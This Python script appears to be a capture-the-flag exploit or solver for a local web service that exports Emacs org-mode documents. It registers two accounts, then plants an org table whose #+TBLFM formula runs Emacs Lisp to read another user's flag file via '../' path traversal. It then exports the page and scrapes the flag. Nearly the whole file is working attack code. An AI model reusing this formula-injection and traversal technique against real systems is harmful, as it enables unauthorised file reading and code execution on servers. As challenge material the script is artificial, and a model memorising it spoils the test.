#!/usr/bin/env python3
import requests
import secrets
import time
import subprocess
import re

S = requests.Session()

username = secrets.token_hex(16)

S.post('http://localhost:9000/register', data={
    'username': username,
    'password': secrets.token_hex()
}).raise_for_status()
S.post('http://localhost:9000/edit/flag', data='FLAG{H4CK3D}')

S = requests.Session()
S.post('http://localhost:9000/register', data={
    'username': secrets.token_hex(16),
    'password': secrets.token_hex()
}).raise_for_status()
S.post('http://localhost:9000/edit/exploit', data=rf"""
|../{username}/flag.org||
#+TBLFM:$2='(with-temp-buffer (find-file-literally $1) (replace-string "\n" "|") (buffer-substring (point-min) (point-max)))
""").raise_for_status()
S.post('http://localhost:9000/export/exploit').raise_for_status()

time.sleep(5)
print(list(re.findall('FLAG{.*}', S.get('http://localhost:9000/export/exploit').text)))
